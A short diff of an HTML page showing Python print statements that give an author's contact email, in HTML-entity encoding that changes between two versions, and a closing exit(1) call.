-<p>​    print(“     WangYihang <a href="mailto:&#x77;&#x61;&#110;&#103;&#121;&#105;&#x68;&#x61;&#110;&#x67;&#101;&#114;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#x6f;&#x6d;">&#x77;&#x61;&#110;&#103;&#121;&#105;&#x68;&#x61;&#110;&#x67;&#101;&#114;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#x6f;&#x6d;</a>“)</p>
+<p>​    print(“     WangYihang <a href="mailto:&#119;&#97;&#110;&#103;&#x79;&#105;&#104;&#x61;&#x6e;&#x67;&#101;&#x72;&#x40;&#x67;&#109;&#x61;&#105;&#x6c;&#46;&#99;&#111;&#x6d;">&#119;&#97;&#110;&#103;&#x79;&#105;&#104;&#x61;&#x6e;&#x67;&#101;&#x72;&#x40;&#x67;&#109;&#x61;&#105;&#x6c;&#46;&#99;&#111;&#x6d;</a>“)</p>
 <p>​    print(“     If you have any questions , please contact me by email.”)</p>
 <p>​    print(“     Thank you for using.”)</p>
 <p>​    exit(1)</p>
